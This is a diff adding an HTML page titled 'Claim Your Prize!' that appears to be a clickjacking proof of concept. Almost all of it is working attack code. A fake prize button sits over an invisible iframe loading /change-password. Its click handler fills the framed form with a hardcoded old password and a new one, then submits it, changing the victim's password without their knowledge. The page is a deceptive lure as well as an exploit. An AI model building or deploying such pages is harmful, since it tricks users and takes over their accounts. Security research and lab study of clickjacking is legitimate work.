@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Prize!</title>
+    <style>
+        body {
+            position: relative;
+            text-align: center;
+            margin-top: 150px;
+        }
+        .fake-button {
+            padding: 20px 40px;
+            background-color: #ff6347;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            border-radius: 5px;
+            z-index: 10; /* Ensure it's above the iframe */
+            position: relative;
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            z-index: 1; /* Ensure iframe is behind */
+            pointer-events: none; /* Prevent interaction with iframe */
+        }
+    </style>
+</head>
+<body>
+    <h1>Congratulations! You've Won a Prize!</h1>
+    <p>Click the button below to claim your reward:</p>
+    <button class="fake-button" onclick="claimPrize()">Claim Your Prize</button>
+
+    <iframe src="/change-password" sandbox="allow-same-origin allow-scripts allow-forms"></iframe>
+
+    <script>
+        function claimPrize() {
+            const oldPassword = "cipiripi"; // Old password
+            const newPassword = "newPassword123"; // New password
+
+            // Access the iframe's document
+            const iframe = document.querySelector('iframe');
+            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+
+            // Fill the form in the iframe
+            iframeDoc.querySelector('input[name="oldPassword"]').value = oldPassword;
+            iframeDoc.querySelector('input[name="newPassword"]').value = newPassword;
+
+            // Submit the form
+            const form = iframeDoc.querySelector('form');
+            if (form) {
+                form.submit();
+            }
+        }
+    </script>
+</body>
+</html>
